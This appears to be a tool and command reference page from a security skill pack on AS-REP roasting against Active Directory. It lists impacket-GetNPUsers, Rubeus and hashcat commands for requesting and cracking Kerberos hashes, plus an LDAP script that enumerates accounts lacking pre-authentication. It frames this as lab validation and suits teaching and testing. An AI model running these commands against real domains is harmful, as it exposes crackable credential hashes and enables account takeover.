# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`active-directory-kerberos-attacks-asrep-roasting`](SKILL.md) | Family: **Network, Active Directory and Endpoint**

Entry points verified against current releases. Impacket, Certipy and netexec rename subcommands between minor versions; check `--help` before scripting.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `impacket-GetNPUsers` | `impacket-GetNPUsers corp.example/ -usersfile users.txt -dc-ip 10.20.30.10 -no-pass -format hashcat -outputfile asrep.txt` | Unauthenticated AS-REP request | Linux / Windows |
| `Rubeus` | `Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt` | AS-REP request from a Windows host | Windows |
| `Get-ADUser` | `Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}` | Directory-side identification | Windows |
| `hashcat` | `hashcat -m 18200 asrep.txt wordlist.txt` | Offline recovery, authorised lab only | Linux / Windows |
| `kinit` | `kinit svc_legacy` | Shows the KDC's pre-auth behaviour interactively | Linux |

## Minimal Lab Validation Script

Identify the roastable set from directory attributes; a network request is only needed to confirm the KDC's response for one account.

```python
from ldap3 import Server, Connection, NTLM

DONT_REQ_PREAUTH = 0x400000
MATCH = "(userAccountControl:1.2.840.113556.1.4.803:=%d)" % DONT_REQ_PREAUTH
srv = Server("10.20.30.10")
conn = Connection(srv, user="CORP\\lowpriv", password="pass", authentication=NTLM, auto_bind=True)
conn.search("DC=corp,DC=example", "(&(objectClass=user)%s)" % MATCH,
            attributes=["sAMAccountName", "userAccountControl", "msDS-SupportedEncryptionTypes"])
for e in conn.entries:
    print(e.sAMAccountName, "flag", hex(int(e.userAccountControl.value)),
          "etypes", e.msDS_SupportedEncryptionTypes.value)
```

## Flag Notes

- `-no-pass` sends no pre-authentication, which is the only way to observe the AS-REP path.
- `-format hashcat` produces `$krb5asrep$` output that records the encryption type in the hash header.
- `-usersfile` bounds the request set, which keeps 4768 volume proportional to the candidate list.
